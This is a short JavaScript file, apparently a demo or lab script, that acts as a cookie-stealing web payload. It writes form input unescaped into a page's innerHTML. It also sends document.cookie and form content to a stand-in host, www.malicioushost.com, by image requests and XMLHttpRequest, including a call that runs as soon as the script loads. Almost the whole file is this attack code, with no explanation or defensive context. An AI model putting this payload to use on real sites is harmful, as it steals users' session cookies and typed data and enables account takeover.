function submit()
{
	var topic = document.getElementById('topic1');
	var content = document.getElementById('content1');
	var listing = document.getElementById('listing');

	listing.innerHTML += 'Topic: ' + topic.value + '<br>' + 'Content: ' + content.value + '<br>'; 
}

function append()
{
	function inject_malicious()
	{
		var image = document.createElement('img');
		image.src = 'http://www.malicioushost.com/leak.php?cookie='+document.cookie;
		var div = document.getElementById('listing');
		div.appendChild(image);
	}
	var source="https://lh3.googleusercontent.com/YGqr3CRLm45jMF8eM8eQxc1VSERDTyzkv1CIng0qjcenJZxqV5DBgH5xlRTawnqNPcOp=w300" 
	var div = document.getElementById('listing');
	var img = document.createElement('img');
	img.src = source;
	img.onload = inject_malicious;
	div.appendChild(img);
}

function bg_req(data)
{
	var xmlHttp = new XMLHttpRequest();
	var url = "http://www.malicioushost.com/submit.php?data=" + data;

	xmlHttp.open("GET", url, true);
	xmlHttp.send(null);
}

function leak()
{
	var content = document.getElementById('content1').value;
	bg_req(content);
}

bg_req(document.cookie);





